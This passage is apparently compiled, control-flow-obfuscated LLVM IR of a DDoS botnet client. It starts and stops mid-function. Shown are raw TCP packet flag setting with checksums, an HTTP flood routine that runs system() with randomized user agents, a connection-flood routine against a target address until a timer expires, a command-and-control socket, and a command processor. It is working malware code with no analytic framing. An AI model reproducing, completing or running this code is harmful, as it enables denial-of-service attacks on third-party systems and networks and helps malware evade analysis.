  %434 = load i16, i16* %433, align 2
  %435 = zext i16 %434 to i32
  %436 = call zeroext i16 @csum(i16* %431, i32 %435)
  %437 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 7
  store i16 %436, i16* %438, align 2
  %439 = load i32, i32* %33, align 4
  %440 = load i32, i32* %23, align 4
  %441 = icmp eq i32 %439, %440
  br i1 %441, label %442, label %465

; <label>:442:                                    ; preds = %396
  %443 = call i64 @time(i64* null) #2
  %444 = load i32, i32* %32, align 4
  %445 = sext i32 %444 to i64
  %446 = icmp sgt i64 %443, %445
  br i1 %446, label %447, label %464

; <label>:447:                                    ; preds = %442
  %448 = load i32, i32* @x.75
  %449 = load i32, i32* @y.76
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %447
  %456 = load i32, i32* @x.75
  %457 = load i32, i32* @y.76
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %468

; <label>:464:                                    ; preds = %442
  store i32 0, i32* %33, align 4
  br label %395

; <label>:465:                                    ; preds = %396
  %466 = load i32, i32* %33, align 4
  %467 = add i32 %466, 1
  store i32 %467, i32* %33, align 4
  br label %395

; <label>:468:                                    ; preds = %originalBBpart2139
  %469 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %469)
  br label %470

; <label>:470:                                    ; preds = %468, %originalBBpart24, %67, %60
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %471 = alloca i8*, align 8
  %472 = alloca i32, align 4
  %473 = alloca i32, align 4
  %474 = alloca i32, align 4
  %475 = alloca i8*, align 8
  %476 = alloca i32, align 4
  %477 = alloca i32, align 4
  %478 = alloca i32, align 4
  %479 = alloca %struct.sockaddr_in, align 4
  %480 = alloca i32, align 4
  %481 = alloca i32, align 4
  %482 = alloca i32, align 4
  %483 = alloca i8*, align 8
  %484 = alloca %struct.iphdr*, align 8
  %485 = alloca %struct.tcphdr*, align 8
  %486 = alloca i8*, align 8
  %487 = alloca i32, align 4
  %488 = alloca i32, align 4
  store i8* %0, i8** %471, align 8
  store i32 %1, i32* %472, align 4
  store i32 %2, i32* %473, align 4
  store i32 %3, i32* %474, align 4
  store i8* %4, i8** %475, align 8
  store i32 %5, i32* %476, align 4
  store i32 %6, i32* %477, align 4
  %489 = load i32, i32* %477, align 4
  store i32 %489, i32* %478, align 4
  %490 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %479, i32 0, i32 0
  store i16 2, i16* %490, align 4
  %491 = load i32, i32* %472, align 4
  %492 = icmp eq i32 %491, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %493 = load i32, i32* @mainCommSock, align 4
  %494 = call i32 (i32, i8*, ...) @sockprintf(i32 %493, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %151
  %495 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %496 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %495, i32 0, i32 0
  %497 = bitcast %union.anon.0* %496 to %struct.anon.1*
  %498 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %497, i32 0, i32 4
  %499 = load i16, i16* %498, align 4
  %_ = sub i16 %499, -513
  %gen = mul i16 %_, -513
  %_7 = sub i16 %499, -513
  %gen8 = mul i16 %_7, -513
  %_9 = sub i16 %499, -513
  %gen10 = mul i16 %_9, -513
  %_11 = sub i16 0, %499
  %gen12 = add i16 %_11, -513
  %_13 = sub i16 0, %499
  %gen14 = add i16 %_13, -513
  %500 = and i16 %499, -513
  %_15 = sub i16 %500, 512
  %gen16 = mul i16 %_15, 512
  %_17 = sub i16 %500, 512
  %gen18 = mul i16 %_17, 512
  %_19 = sub i16 0, %500
  %gen20 = add i16 %_19, 512
  %_21 = sub i16 0, %500
  %gen22 = add i16 %_21, 512
  %_23 = sub i16 %500, 512
  %gen24 = mul i16 %_23, 512
  %_25 = sub i16 %500, 512
  %gen26 = mul i16 %_25, 512
  %_27 = shl i16 %500, 512
  %_28 = sub i16 0, %500
  %gen29 = add i16 %_28, 512
  %_30 = sub i16 0, %500
  %gen31 = add i16 %_30, 512
  %501 = or i16 %500, 512
  store i16 %501, i16* %498, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 0
  %504 = bitcast %union.anon.0* %503 to %struct.anon.1*
  %505 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %504, i32 0, i32 4
  %506 = load i16, i16* %505, align 4
  %_32 = sub i16 %506, -1025
  %gen33 = mul i16 %_32, -1025
  %_34 = shl i16 %506, -1025
  %_35 = shl i16 %506, -1025
  %_36 = sub i16 0, %506
  %gen37 = add i16 %_36, -1025
  %507 = and i16 %506, -1025
  %_38 = shl i16 %507, 1024
  %_39 = sub i16 0, %507
  %gen40 = add i16 %_39, 1024
  %_41 = shl i16 %507, 1024
  %_42 = shl i16 %507, 1024
  %_43 = sub i16 0, %507
  %gen44 = add i16 %_43, 1024
  %_45 = shl i16 %507, 1024
  %_46 = sub i16 0, %507
  %gen47 = add i16 %_46, 1024
  %508 = or i16 %507, 1024
  store i16 %508, i16* %505, align 4
  %509 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 0
  %511 = bitcast %union.anon.0* %510 to %struct.anon.1*
  %512 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %511, i32 0, i32 4
  %513 = load i16, i16* %512, align 4
  %_48 = sub i16 %513, -257
  %gen49 = mul i16 %_48, -257
  %_50 = sub i16 0, %513
  %gen51 = add i16 %_50, -257
  %_52 = sub i16 %513, -257
  %gen53 = mul i16 %_52, -257
  %_54 = sub i16 0, %513
  %gen55 = add i16 %_54, -257
  %_56 = sub i16 %513, -257
  %gen57 = mul i16 %_56, -257
  %_58 = sub i16 %513, -257
  %gen59 = mul i16 %_58, -257
  %514 = and i16 %513, -257
  %_60 = sub i16 0, %514
  %gen61 = add i16 %_60, 256
  %_62 = shl i16 %514, 256
  %_63 = sub i16 %514, 256
  %gen64 = mul i16 %_63, 256
  %_65 = sub i16 0, %514
  %gen66 = add i16 %_65, 256
  %_67 = sub i16 %514, 256
  %gen68 = mul i16 %_67, 256
  %_69 = sub i16 0, %514
  %gen70 = add i16 %_69, 256
  %515 = or i16 %514, 256
  store i16 %515, i16* %512, align 4
  %516 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 0
  %518 = bitcast %union.anon.0* %517 to %struct.anon.1*
  %519 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %518, i32 0, i32 4
  %520 = load i16, i16* %519, align 4
  %_71 = shl i16 %520, -4097
  %521 = and i16 %520, -4097
  %_72 = shl i16 %521, 4096
  %522 = or i16 %521, 4096
  store i16 %522, i16* %519, align 4
  %523 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 0
  %525 = bitcast %union.anon.0* %524 to %struct.anon.1*
  %526 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %525, i32 0, i32 4
  %527 = load i16, i16* %526, align 4
  %_73 = sub i16 %527, -2049
  %gen74 = mul i16 %_73, -2049
  %_75 = shl i16 %527, -2049
  %_76 = sub i16 %527, -2049
  %gen77 = mul i16 %_76, -2049
  %_78 = shl i16 %527, -2049
  %_79 = sub i16 0, %527
  %gen80 = add i16 %_79, -2049
  %_81 = sub i16 %527, -2049
  %gen82 = mul i16 %_81, -2049
  %_83 = sub i16 0, %527
  %gen84 = add i16 %_83, -2049
  %_85 = sub i16 0, %527
  %gen86 = add i16 %_85, -2049
  %528 = and i16 %527, -2049
  %_87 = sub i16 0, %528
  %gen88 = add i16 %_87, 2048
  %_89 = sub i16 %528, 2048
  %gen90 = mul i16 %_89, 2048
  %_91 = shl i16 %528, 2048
  %_92 = shl i16 %528, 2048
  %529 = or i16 %528, 2048
  store i16 %529, i16* %526, align 4
  br label %originalBB6

originalBB96alteredBB:                            ; preds = %originalBB96, %213
  %530 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 0
  %532 = bitcast %union.anon.0* %531 to %struct.anon.1*
  %533 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %532, i32 0, i32 4
  %534 = load i16, i16* %533, align 4
  %_97 = shl i16 %534, -513
  %_98 = shl i16 %534, -513
  %_99 = sub i16 0, %534
  %gen100 = add i16 %_99, -513
  %_101 = sub i16 0, %534
  %gen102 = add i16 %_101, -513
  %_103 = sub i16 0, %534
  %gen104 = add i16 %_103, -513
  %535 = and i16 %534, -513
  %_105 = sub i16 0, %535
  %gen106 = add i16 %_105, 512
  %536 = or i16 %535, 512
  store i16 %536, i16* %533, align 4
  br label %originalBB96

originalBB110alteredBB:                           ; preds = %originalBB110, %265
  %537 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 0
  %539 = bitcast %union.anon.0* %538 to %struct.anon.1*
  %540 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %539, i32 0, i32 4
  %541 = load i16, i16* %540, align 4
  %_111 = sub i16 0, %541
  %gen112 = add i16 %_111, -4097
  %_113 = sub i16 0, %541
  %gen114 = add i16 %_113, -4097
  %_115 = sub i16 0, %541
  %gen116 = add i16 %_115, -4097
  %_117 = sub i16 %541, -4097
  %gen118 = mul i16 %_117, -4097
  %542 = and i16 %541, -4097
  %_119 = shl i16 %542, 4096
  %_120 = sub i16 %542, 4096
  %gen121 = mul i16 %_120, 4096
  %_122 = sub i16 %542, 4096
  %gen123 = mul i16 %_122, 4096
  %_124 = sub i16 0, %542
  %gen125 = add i16 %_124, 4096
  %543 = or i16 %542, 4096
  store i16 %543, i16* %540, align 4
  br label %originalBB110

originalBB129alteredBB:                           ; preds = %originalBB129, %312
  %544 = call i32 @rand_cmwc()
  %545 = trunc i32 %544 to i16
  %546 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 0
  %548 = bitcast %union.anon.0* %547 to %struct.anon.1*
  %549 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %548, i32 0, i32 5
  store i16 %545, i16* %549, align 2
  %550 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 0
  %552 = bitcast %union.anon.0* %551 to %struct.anon.1*
  %553 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %552, i32 0, i32 6
  store i16 0, i16* %553, align 4
  %554 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 0
  %556 = bitcast %union.anon.0* %555 to %struct.anon.1*
  %557 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %556, i32 0, i32 7
  store i16 0, i16* %557, align 2
  %558 = load i32, i32* %17, align 4
  %559 = icmp eq i32 %558, 0
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %345
  %560 = call i32 @rand_cmwc()
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %447
  br label %originalBB137
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = load i32, i32* @x.77
  %4 = load i32, i32* @y.78
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca [80 x i8*], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %17 = call i64 @time(i64* null) #2
  %18 = load i32, i32* %12, align 4
  %19 = sext i32 %18 to i64
  %20 = add nsw i64 %17, %19
  %21 = trunc i64 %20 to i32
  store i32 %21, i32* %13, align 4
  %22 = call i32 @rand() #2
  %23 = sext i32 %22 to i64
  %24 = urem i64 %23, 23
  %25 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  store i8* %26, i8** %15, align 8
  %27 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %28 = bitcast i8** %27 to i8*
  %29 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %30 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %31 = bitcast i8** %30 to i8*
  %32 = load i8*, i8** %15, align 8
  %33 = call i8* @strcat(i8* %31, i8* %32) #2
  %34 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %35 = bitcast i8** %34 to i8*
  %36 = call i8* @strcat(i8* %35, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %37 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %38 = bitcast i8** %37 to i8*
  %39 = load i8*, i8** %11, align 8
  %40 = call i8* @strcat(i8* %38, i8* %39) #2
  %41 = load i32, i32* @x.77
  %42 = load i32, i32* @y.78
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %originalBBpart236, %originalBBpart2
  %50 = load i32, i32* @x.77
  %51 = load i32, i32* @y.78
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %49
  %58 = load i32, i32* %13, align 4
  %59 = sext i32 %58 to i64
  %60 = call i64 @time(i64* null) #2
  %61 = icmp sgt i64 %59, %60
  %62 = load i32, i32* @x.77
  %63 = load i32, i32* @y.78
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %61, label %70, label %109

; <label>:70:                                     ; preds = %originalBBpart231
  %71 = load i32, i32* @x.77
  %72 = load i32, i32* @y.78
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %70
  %79 = call i32 @rand() #2
  %80 = sext i32 %79 to i64
  %81 = urem i64 %80, 23
  %82 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %81
  %83 = load i8*, i8** %82, align 8
  store i8* %83, i8** %15, align 8
  %84 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %85 = bitcast i8** %84 to i8*
  %86 = call i32 (i8*, i8*, ...) @sprintf(i8* %85, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %87 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %88 = bitcast i8** %87 to i8*
  %89 = load i8*, i8** %15, align 8
  %90 = call i8* @strcat(i8* %88, i8* %89) #2
  %91 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %92 = bitcast i8** %91 to i8*
  %93 = call i8* @strcat(i8* %92, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %94 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %95 = bitcast i8** %94 to i8*
  %96 = load i8*, i8** %11, align 8
  %97 = call i8* @strcat(i8* %95, i8* %96) #2
  %98 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %99 = bitcast i8** %98 to i8*
  %100 = call i32 @system(i8* %99)
  %101 = load i32, i32* @x.77
  %102 = load i32, i32* @y.78
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart236, label %originalBB33alteredBB

originalBBpart236:                                ; preds = %originalBB33
  br label %49

; <label>:109:                                    ; preds = %originalBBpart231
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %110 = alloca i8*, align 8
  %111 = alloca i32, align 4
  %112 = alloca i32, align 4
  %113 = alloca %struct._IO_FILE*, align 8
  %114 = alloca i8*, align 8
  %115 = alloca [80 x i8*], align 16
  store i8* %0, i8** %110, align 8
  store i32 %1, i32* %111, align 4
  %116 = call i64 @time(i64* null) #2
  %117 = load i32, i32* %111, align 4
  %118 = sext i32 %117 to i64
  %_ = sub i64 %116, %118
  %gen = mul i64 %_, %118
  %_1 = sub i64 %116, %118
  %gen2 = mul i64 %_1, %118
  %_3 = shl i64 %116, %118
  %_4 = sub i64 %116, %118
  %gen5 = mul i64 %_4, %118
  %_6 = sub i64 %116, %118
  %gen7 = mul i64 %_6, %118
  %_8 = sub i64 0, %116
  %gen9 = add i64 %_8, %118
  %_10 = sub i64 0, %116
  %gen11 = add i64 %_10, %118
  %_12 = sub i64 %116, %118
  %gen13 = mul i64 %_12, %118
  %_14 = shl i64 %116, %118
  %119 = add nsw i64 %116, %118
  %120 = trunc i64 %119 to i32
  store i32 %120, i32* %112, align 4
  %121 = call i32 @rand() #2
  %122 = sext i32 %121 to i64
  %_15 = sub i64 %122, 23
  %gen16 = mul i64 %_15, 23
  %_17 = shl i64 %122, 23
  %_18 = shl i64 %122, 23
  %_19 = sub i64 0, %122
  %gen20 = add i64 %_19, 23
  %_21 = shl i64 %122, 23
  %_22 = sub i64 0, %122
  %gen23 = add i64 %_22, 23
  %_24 = sub i64 %122, 23
  %gen25 = mul i64 %_24, 23
  %_26 = sub i64 0, %122
  %gen27 = add i64 %_26, 23
  %_28 = shl i64 %122, 23
  %123 = urem i64 %122, 23
  %124 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %123
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %114, align 8
  %126 = getelementptr inbounds [80 x i8*], [80 x i8*]* %115, i32 0, i32 0
  %127 = bitcast i8** %126 to i8*
  %128 = call i32 (i8*, i8*, ...) @sprintf(i8* %127, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %129 = getelementptr inbounds [80 x i8*], [80 x i8*]* %115, i32 0, i32 0
  %130 = bitcast i8** %129 to i8*
  %131 = load i8*, i8** %114, align 8
  %132 = call i8* @strcat(i8* %130, i8* %131) #2
  %133 = getelementptr inbounds [80 x i8*], [80 x i8*]* %115, i32 0, i32 0
  %134 = bitcast i8** %133 to i8*
  %135 = call i8* @strcat(i8* %134, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %136 = getelementptr inbounds [80 x i8*], [80 x i8*]* %115, i32 0, i32 0
  %137 = bitcast i8** %136 to i8*
  %138 = load i8*, i8** %110, align 8
  %139 = call i8* @strcat(i8* %137, i8* %138) #2
  br label %originalBB

originalBB29alteredBB:                            ; preds = %originalBB29, %49
  %140 = load i32, i32* %13, align 4
  %141 = sext i32 %140 to i64
  %142 = call i64 @time(i64* null) #2
  %143 = icmp sgt i64 %141, %142
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %70
  %144 = call i32 @rand() #2
  %145 = sext i32 %144 to i64
  %_34 = shl i64 %145, 23
  %146 = urem i64 %145, 23
  %147 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %146
  %148 = load i8*, i8** %147, align 8
  store i8* %148, i8** %15, align 8
  %149 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %150 = bitcast i8** %149 to i8*
  %151 = call i32 (i8*, i8*, ...) @sprintf(i8* %150, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %152 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %153 = bitcast i8** %152 to i8*
  %154 = load i8*, i8** %15, align 8
  %155 = call i8* @strcat(i8* %153, i8* %154) #2
  %156 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %157 = bitcast i8** %156 to i8*
  %158 = call i8* @strcat(i8* %157, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %159 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %160 = bitcast i8** %159 to i8*
  %161 = load i8*, i8** %11, align 8
  %162 = call i8* @strcat(i8* %160, i8* %161) #2
  %163 = getelementptr inbounds [80 x i8*], [80 x i8*]* %16, i32 0, i32 0
  %164 = bitcast i8** %163 to i8*
  %165 = call i32 @system(i8* %164)
  br label %originalBB33
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.79
  %5 = load i32, i32* @y.80
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %18 = call i64 @time(i64* null) #2
  %19 = load i32, i32* %14, align 4
  %20 = sext i32 %19 to i64
  %21 = add nsw i64 %18, %20
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %15, align 4
  %23 = load i8*, i8** %12, align 8
  %24 = call i32 @inet_addr(i8* %23) #2
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %26 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %25, i32 0, i32 0
  store i32 %24, i32* %26, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %13, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* @x.79
  %33 = load i32, i32* @y.80
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %61, %originalBBpart2
  %41 = load i32, i32* @x.79
  %42 = load i32, i32* @y.80
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %40
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = call i64 @time(i64* null) #2
  %52 = icmp sgt i64 %50, %51
  %53 = load i32, i32* @x.79
  %54 = load i32, i32* @y.80
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br i1 %52, label %61, label %69

; <label>:61:                                     ; preds = %originalBBpart210
  %62 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %62, i32* %16, align 4
  %63 = load i32, i32* %16, align 4
  %64 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %65 = call i32 @connect(i32 %63, %struct.sockaddr* %64, i32 16)
  %66 = call i32 @sleep(i32 1)
  %67 = load i32, i32* %16, align 4
  %68 = call i32 @close(i32 %67)
  br label %40

; <label>:69:                                     ; preds = %originalBBpart210
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %70 = alloca i8*, align 8
  %71 = alloca i32, align 4
  %72 = alloca i32, align 4
  %73 = alloca i32, align 4
  %74 = alloca i32, align 4
  %75 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %70, align 8
  store i32 %1, i32* %71, align 4
  store i32 %2, i32* %72, align 4
  %76 = call i64 @time(i64* null) #2
  %77 = load i32, i32* %72, align 4
  %78 = sext i32 %77 to i64
  %_ = sub i64 %76, %78
  %gen = mul i64 %_, %78
  %_1 = sub i64 %76, %78
  %gen2 = mul i64 %_1, %78
  %_3 = shl i64 %76, %78
  %_4 = sub i64 %76, %78
  %gen5 = mul i64 %_4, %78
  %_6 = sub i64 %76, %78
  %gen7 = mul i64 %_6, %78
  %79 = add nsw i64 %76, %78
  %80 = trunc i64 %79 to i32
  store i32 %80, i32* %73, align 4
  %81 = load i8*, i8** %70, align 8
  %82 = call i32 @inet_addr(i8* %81) #2
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %75, i32 0, i32 2
  %84 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %83, i32 0, i32 0
  store i32 %82, i32* %84, align 4
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %75, i32 0, i32 0
  store i16 2, i16* %85, align 4
  %86 = load i32, i32* %71, align 4
  %87 = trunc i32 %86 to i16
  %88 = call zeroext i16 @htons(i16 zeroext %87) #13
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %75, i32 0, i32 1
  store i16 %88, i16* %89, align 2
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %40
  %90 = load i32, i32* %15, align 4
  %91 = sext i32 %90 to i64
  %92 = call i64 @time(i64* null) #2
  %93 = icmp sgt i64 %91, %92
  br label %originalBB8
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
